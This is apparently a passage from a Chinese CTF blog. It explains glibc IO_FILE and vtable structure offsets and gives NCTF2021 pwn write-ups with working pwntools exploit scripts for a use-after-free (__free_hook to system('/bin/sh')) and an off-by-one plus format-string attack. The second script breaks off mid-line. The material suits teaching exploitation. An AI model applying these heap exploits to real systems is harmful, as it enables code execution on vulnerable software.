    <content type="html"><![CDATA[<h2 id="IO-FILE-结构体">IO_FILE 结构体</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE_complete_plus</span></span><br><span class="hljs-class">&#123;</span><br> <span class="hljs-comment">/* +00 */</span> <span class="hljs-type">int</span> _flags;<br> <span class="hljs-comment">/* +08 */</span> <span class="hljs-type">char</span> *_IO_read_ptr;<br> <span class="hljs-comment">/* +10 */</span> <span class="hljs-type">char</span> *_IO_read_end;<br> <span class="hljs-comment">/* +18 */</span> <span class="hljs-type">char</span> *_IO_read_base;<br> <span class="hljs-comment">/* +20 */</span> <span class="hljs-type">char</span> *_IO_write_base;<br> <span class="hljs-comment">/* +28 */</span> <span class="hljs-type">char</span> *_IO_write_ptr;<br> <span class="hljs-comment">/* +30 */</span> <span class="hljs-type">char</span> *_IO_write_end;<br> <span class="hljs-comment">/* +38 */</span> <span class="hljs-type">char</span> *_IO_buf_base;<br> <span class="hljs-comment">/* +40 */</span> <span class="hljs-type">char</span> *_IO_buf_end;<br> <span class="hljs-comment">/* +48 */</span> <span class="hljs-type">char</span> *_IO_save_base;<br> <span class="hljs-comment">/* +50 */</span> <span class="hljs-type">char</span> *_IO_backup_base;<br> <span class="hljs-comment">/* +58 */</span> <span class="hljs-type">char</span> *_IO_save_end;<br> <span class="hljs-comment">/* +60 */</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_marker</span> *_<span class="hljs-title">markers</span>;</span><br> <span class="hljs-comment">/* +68 */</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_FILE</span> *_<span class="hljs-title">chain</span>;</span><br> <span class="hljs-comment">/* +70 */</span> <span class="hljs-type">int</span> _fileno;<br> <span class="hljs-comment">/* +74 */</span> <span class="hljs-type">int</span> _flags2;<br> <span class="hljs-comment">/* +78 */</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> _old_offset;<br> <span class="hljs-comment">/* +80 */</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">short</span> _cur_column;<br> <span class="hljs-comment">/* +82 */</span> <span class="hljs-type">signed</span> <span class="hljs-type">char</span> _vtable_offset;<br> <span class="hljs-comment">/* +83 */</span> <span class="hljs-type">char</span> _shortbuf[<span class="hljs-number">1</span>];<br> <span class="hljs-comment">/* +88 */</span> <span class="hljs-type">char</span>* *_lock;<br> <span class="hljs-comment">/* +90 */</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span>  _offset;<br> <span class="hljs-comment">/* +98 */</span> <span class="hljs-type">char</span> *_codecvt;<br> <span class="hljs-comment">/* +a0 */</span> <span class="hljs-type">char</span> *_wide_data;<br> <span class="hljs-comment">/* +a8 */</span> <span class="hljs-type">char</span> *_freeres_list;<br> <span class="hljs-comment">/* +b0 */</span> <span class="hljs-type">void</span> *_freeres_buf;<br> <span class="hljs-comment">/* +b8 */</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> <span class="hljs-type">int</span> __pad5;<br> <span class="hljs-comment">/* +c0 */</span> <span class="hljs-type">int</span> _mode;<br> <span class="hljs-comment">/* +c4 */</span> <span class="hljs-type">char</span> _unused2[<span class="hljs-number">15</span> * <span class="hljs-number">4</span> - <span class="hljs-number">4</span> * <span class="hljs-number">8</span> - <span class="hljs-number">8</span>];<br> <span class="hljs-comment">/* +d8 */</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> *<span class="hljs-title">vtable</span></span><br><span class="hljs-class">&#125;</span><br><span class="hljs-class"></span><br><span class="hljs-class"></span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span></span><br><span class="hljs-class">&#123;</span><br> <span class="hljs-comment">/* +00 */</span> JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy);<br> <span class="hljs-comment">/* +08 */</span> JUMP_FIELD(<span class="hljs-type">size_t</span>, __dummy2);<br> <span class="hljs-comment">/* +10 */</span> JUMP_FIELD(_IO_finish_t, __finish);<br> <span class="hljs-comment">/* +18 */</span> JUMP_FIELD(_IO_overflow_t, __overflow);<br> <span class="hljs-comment">/* +20 */</span> JUMP_FIELD(_IO_underflow_t, __underflow);<br> <span class="hljs-comment">/* +28 */</span> JUMP_FIELD(_IO_underflow_t, __uflow);<br> <span class="hljs-comment">/* +30 */</span> JUMP_FIELD(_IO_pbackfail_t, __pbackfail);<br> <span class="hljs-comment">/* +38 */</span> JUMP_FIELD(_IO_xsputn_t, __xsputn);<br> <span class="hljs-comment">/* +40 */</span> JUMP_FIELD(_IO_xsgetn_t, __xsgetn);<br> <span class="hljs-comment">/* +48 */</span> JUMP_FIELD(_IO_seekoff_t, __seekoff);<br> <span class="hljs-comment">/* +50 */</span> JUMP_FIELD(_IO_seekpos_t, __seekpos);<br> <span class="hljs-comment">/* +58 */</span> JUMP_FIELD(_IO_setbuf_t, __setbuf);<br> <span class="hljs-comment">/* +60 */</span> JUMP_FIELD(_IO_sync_t, __sync);<br> <span class="hljs-comment">/* +68 */</span> JUMP_FIELD(_IO_doallocate_t, __doallocate);<br> <span class="hljs-comment">/* +70 */</span> JUMP_FIELD(_IO_read_t, __read);<br> <span class="hljs-comment">/* +78 */</span> JUMP_FIELD(_IO_write_t, __write);<br> <span class="hljs-comment">/* +80 */</span> JUMP_FIELD(_IO_seek_t, __seek);<br> <span class="hljs-comment">/* +88 */</span> JUMP_FIELD(_IO_close_t, __close);<br> <span class="hljs-comment">/* +90 */</span> JUMP_FIELD(_IO_stat_t, __stat);<br> <span class="hljs-comment">/* +98 */</span> JUMP_FIELD(_IO_showmanyc_t, __showmanyc);<br> <span class="hljs-comment">/* +a0 */</span> JUMP_FIELD(_IO_imbue_t, __imbue);<br>&#125;;<br><br><span class="hljs-comment">/* 泄露信息</span><br><span class="hljs-comment">    通过修改IO结构体的flag项的_IO_IS_APPENDING位为1</span><br><span class="hljs-comment">    使在进行输出时不会检测有关read的三个指针</span><br><span class="hljs-comment">    然后控制write_ptr到 write_end之间有需要获取的数据</span><br><span class="hljs-comment">    当程序在进行输出操作时就会先将write_ptr到write_end之间的数据输出</span><br><span class="hljs-comment">    然后再输出程序需要输出的数据</span><br><span class="hljs-comment">    这样可以泄露libc中的信息</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-comment">/* 执行gadget</span><br><span class="hljs-comment">    在较老版本中可以通过直接修改vtable中的某一项，来控制程序</span><br><span class="hljs-comment">    在新版本中需要控制vtable的偏移，使其程序在执行某一个IO流操作时</span><br><span class="hljs-comment">    执行到一个没有对vtable的地址进行检测的函数</span><br><span class="hljs-comment">    在这个函数中进行某些操作，然后执行我们想要执行的函数</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="常用IO-jump-t">常用IO_jump_t</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_file_jumps</span>  =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_file_finish),<br>  JUMP_INIT(overflow, _IO_file_overflow),<br>  JUMP_INIT(underflow, _IO_file_underflow),<br>  JUMP_INIT(uflow, _IO_default_uflow),<br>  JUMP_INIT(pbackfail, _IO_default_pbackfail),<br>  JUMP_INIT(xsputn, _IO_file_xsputn),<br>  JUMP_INIT(xsgetn, _IO_file_xsgetn),<br>  JUMP_INIT(seekoff, _IO_new_file_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_new_file_setbuf),<br>  JUMP_INIT(sync, _IO_new_file_sync),<br>  JUMP_INIT(doallocate, _IO_file_doallocate),<br>  JUMP_INIT(read, _IO_file_read),<br>  JUMP_INIT(write, _IO_new_file_write),<br>  JUMP_INIT(seek, _IO_file_seek),<br>  JUMP_INIT(close, _IO_file_close),<br>  JUMP_INIT(stat, _IO_file_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br><br><span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_wfile_jumps</span>  =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT(finish, _IO_new_file_finish),<br>  JUMP_INIT(overflow, (_IO_overflow_t) _IO_wfile_overflow),<br>  JUMP_INIT(underflow, (_IO_underflow_t) _IO_wfile_underflow),<br>  JUMP_INIT(uflow, (_IO_underflow_t) _IO_wdefault_uflow),<br>  JUMP_INIT(pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),<br>  JUMP_INIT(xsputn, _IO_wfile_xsputn),<br>  JUMP_INIT(xsgetn, _IO_file_xsgetn),<br>  JUMP_INIT(seekoff, _IO_wfile_seekoff),<br>  JUMP_INIT(seekpos, _IO_default_seekpos),<br>  JUMP_INIT(setbuf, _IO_new_file_setbuf),<br>  JUMP_INIT(sync, (_IO_sync_t) _IO_wfile_sync),<br>  JUMP_INIT(doallocate, _IO_wfile_doallocate),<br>  JUMP_INIT(read, _IO_file_read),<br>  JUMP_INIT(write, _IO_new_file_write),<br>  JUMP_INIT(seek, _IO_file_seek),<br>  JUMP_INIT(close, _IO_file_close),<br>  JUMP_INIT(stat, _IO_file_stat),<br>  JUMP_INIT(showmanyc, _IO_default_showmanyc),<br>  JUMP_INIT(imbue, _IO_default_imbue)<br>&#125;;<br><br><span class="hljs-type">static</span> <span class="hljs-type">const</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">IO_jump_t</span> _<span class="hljs-title">IO_helper_jumps</span>  =</span><br>&#123;<br>  JUMP_INIT_DUMMY,<br>  JUMP_INIT (finish, _IO_wdefault_finish),<br>  JUMP_INIT (overflow, _IO_helper_overflow),<br>  JUMP_INIT (underflow, _IO_default_underflow),<br>  JUMP_INIT (uflow, _IO_default_uflow),<br>  JUMP_INIT (pbackfail, (_IO_pbackfail_t) _IO_wdefault_pbackfail),<br>  JUMP_INIT (xsputn, _IO_wdefault_xsputn),<br>  JUMP_INIT (xsgetn, _IO_wdefault_xsgetn),<br>  JUMP_INIT (seekoff, _IO_default_seekoff),<br>  JUMP_INIT (seekpos, _IO_default_seekpos),<br>  JUMP_INIT (setbuf, _IO_default_setbuf),<br>  JUMP_INIT (sync, _IO_default_sync),<br>  JUMP_INIT (doallocate, _IO_wdefault_doallocate),<br>  JUMP_INIT (read, _IO_default_read),<br>  JUMP_INIT (write, _IO_default_write),<br>  JUMP_INIT (seek, _IO_default_seek),<br>  JUMP_INIT (close, _IO_default_close),<br>  JUMP_INIT (stat, _IO_default_stat)<br>&#125;;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>heap</category>
      
    </categories>
    
    
    <tags>
      
      <tag>ctf</tag>
      
      <tag>pwn</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>NCTF2021-pwn</title>
    <link href="/page/wp/NCTF2021-pwn/"/>
    <url>/page/wp/NCTF2021-pwn/</url>
    
    <content type="html"><![CDATA[<h2 id="ezheap">ezheap</h2><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-ezheap.jpg" srcset="/img/loading.gif" lazyload alt="alloc函数代码" title="alloc函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-ezheap-1.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-ezheap-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-ezheap-3.jpg" srcset="/img/loading.gif" lazyload alt="show函数代码" title="show函数代码"></p><p>在<code>delete函数</code>中存在<code>UAF漏洞</code>，可以多次释放同一个<code>chunk</code>，但如果<code>chunk</code>已经被释放，则无法修改<code>chunk</code>数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>libc=ELF(<span class="hljs-string">&#x27;libc-2.33.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,text=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&quot;Content: &quot;</span>,text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,text</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;&gt;&gt; &#x27;</span>,<span class="hljs-string">&#x27;4&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br>p=remote(<span class="hljs-string">&#x27;127.0.0.1:4444&#x27;</span>)<br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#0</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#2</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#3</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#4</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#5</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#6</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#7</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#8</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#9</span><br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#10</span><br>free(<span class="hljs-number">0</span>)<br>free(<span class="hljs-number">1</span>)<br>free(<span class="hljs-number">2</span>)<br>free(<span class="hljs-number">3</span>)<br>free(<span class="hljs-number">4</span>)<br>free(<span class="hljs-number">5</span>)<br>free(<span class="hljs-number">6</span>) <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    释放chunk 将tcache bin填满，达到将chunk放入unsorted bin中的目的</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>free(<span class="hljs-number">7</span>)<br>show(<span class="hljs-number">7</span>)<br>main_arena=u64(p.read(<span class="hljs-number">8</span>))-<span class="hljs-number">0x60</span><br>malloc_hook=main_arena-<span class="hljs-number">0x10</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(malloc_hook-<span class="hljs-number">0x10</span>))<br>libc.address=malloc_hook-libc.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>]<br>free_hook=libc.sym[<span class="hljs-string">&#x27;__free_hook&#x27;</span>]<br>system=libc.sym[<span class="hljs-string">&#x27;system&#x27;</span>]<br>free(<span class="hljs-number">9</span>)<br>show(<span class="hljs-number">9</span>) <br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    因为在2.33 中单链表bin中chunk的地址被加密了，所以需要</span><br><span class="hljs-string">    向unsorted bin中放入两个chunk，用于获取chunk的地址</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>    <br>heap_add=u64(p.read(<span class="hljs-number">8</span>))  <span class="hljs-comment">#7</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(heap_add))<br>add(<span class="hljs-number">128</span>) <span class="hljs-comment">#11</span><br>free(<span class="hljs-number">6</span>)<br>c6_add=heap_add-<span class="hljs-number">0x90</span><br>hook_add=((c6_add+<span class="hljs-number">0x10</span>)&gt;&gt;<span class="hljs-number">12</span>)^(free_hook)<br>edit(<span class="hljs-number">11</span>,p64(hook_add))<br><br>add(<span class="hljs-number">128</span>,<span class="hljs-string">&#x27;/bin/sh&#x27;</span>) <span class="hljs-comment">#12</span><br>add(<span class="hljs-number">128</span>,p64(system)) <span class="hljs-comment">#13</span><br>free(<span class="hljs-number">12</span>) // 利用free_hook 执行 system(<span class="hljs-string">&#x27;/bin/sh&#x27;</span>)<br>p.interactive()<br></code></pre></td></tr></table></figure><h2 id="mmmmmmmap">mmmmmmmap</h2><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-mmmmmmmap.jpg" srcset="/img/loading.gif" lazyload alt="create函数代码" title="create函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-mmmmmmmap-1.jpg" srcset="/img/loading.gif" lazyload alt="edit函数代码" title="edit函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-mmmmmmmap-2.jpg" srcset="/img/loading.gif" lazyload alt="delete函数代码" title="delete函数代码"></p><p><img src="/img/blog_img/NCTF2021/NCTF2021-pwn-mmmmmmmap-3.jpg" srcset="/img/loading.gif" lazyload alt="fmt函数代码" title="fmt函数代码"></p><p>在<code>fmt函数</code>中，存在格式化字符串漏洞，不过前提时输出<code>buf</code>指向地址处空间时出错，程序在正常情况下调用<code>write</code>是不会出问题，所以只能先让<code>buf</code>指向区域无法访问，然后在指向<code>write</code>时就会报错返回小于0的数字</p><p>因为<code>buf</code>指向的区域为堆空间，而对堆空间进行释放时，是不会修改空间的权限的，只有对<code>mmap</code>分配的<code>chunk</code>，进行释放操作时才会使空间无法访问，所以需要先伪造<code>buf</code>指向的<code>chunk</code>为<code>mmap</code>分配的<code>chunk</code>，且<code>chunk</code>的大小要与<code>page</code>对齐，也就是<code>0x1000</code>,在<code>edit函数</code>中存在<code>off by one</code>漏洞，刚好可以利用这个达到目的</p><p>然后利用非栈中格式化字符串，构造<code>exit_hook</code>，调用<code>exit</code>函数获取<code>shell</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>libc=ELF(<span class="hljs-string">&quot;libc-2.31.so&quot;</span>,checksec=<span class="hljs-number">0</span>)<br>ld=ELF(<span class="hljs-string">&#x27;ld-2.31.so&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br>e=ELF(<span class="hljs-string">&#x27;mmmmmmmap&#x27;</span>,checksec=<span class="hljs-number">0</span>)<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,text=<span class="hljs-string">&#x27;&#x27;</span></span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;1&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Size: &#x27;</span>,<span class="hljs-built_in">str</span>(size))<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,text)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">ind,text</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;2&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&quot;Index: &quot;</span>,<span class="hljs-built_in">str</span>(ind))<br>    data=<span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> text:<br>        data+=<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">ord</span>(i)^<span class="hljs-number">3</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Content: &#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">ind</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;choice: &#x27;</span>,<span class="hljs-string">&#x27;3&#x27;</span>)<br>    p.sendlineafter(<span class="hljs-string">&#x27;Index: &#x27;</span>,<span class="hljs-built_in">str</span>(ind))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">fmt</span>(<span class="hljs-params">data</span>):<br>    p.sendlineafter(<span class="hljs-string">&#x27;INPUT:\n&#x27;</span>,data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getdata</span>(<span class="hljs-params">off</span>):<br>    fmt(<span class="hljs-string">&#x27;%&#x27;</span>+<span class="hljs-built_in">str</span>(off)+<span class="hljs-string">&#x27;$p\n&#x27;</span>)<br>    addr=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>,drop=<span class="hljs-number">1</span>),<span class="hljs-number">16</span>)<br>    <span class="hljs-keyword">return</span> addr<br>    <br>p=remote(<span class="hljs-string">&quot;127.0.0.1:4444&quot;</span>)<br>p.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>add(<span class="hljs-number">0xd18</span>)<span class="hljs-comment">#0</span><br>add(<span class="hljs-number">0x18</span>) <span class="hljs-comment">#1</span><br>add(<span class="hljs-number">0xff8</span>)<span class="hljs-comment">#2</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    这里的chunk0，就是为了让chunk2的地址&amp;0xfff==0</span><br><span class="hljs-string">    0xff8 chunksize== 0x1001  </span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>edit(<span class="hljs-number">1</span>,<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(<span class="hljs-number">0x2000</span>))<br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    在edit函数中会对输入的数据异或3，而且会多异或一个字节</span><br><span class="hljs-string">    所以会将chunk 2的size变成0x1002 就表示chunk2由mmap分配</span><br><span class="hljs-string">    而且因为inuse位为0，所以mmap在释放chunk2时会连带释放chunk2前面的0x2000个字节的数据</span><br><span class="hljs-string">    buf指向的空间就在这0x2000个字节里面</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br>free(<span class="hljs-number">2</span>)<br><br>p.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>fmt(<span class="hljs-string">b&#x27;%11$p\n%7$p\n&#x27;</span>)<br>libc.address=<span class="hljs-built_in">int</span>(p.readuntil(<span class="hljs-string">&#x27;\n&#x27;</span>),<span class="hljs-number">16</span>)-<span class="hljs-number">243</span>-libc.sym[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br>e.address=<span class="hljs-built_in">int</span>(p.readuntil(<span 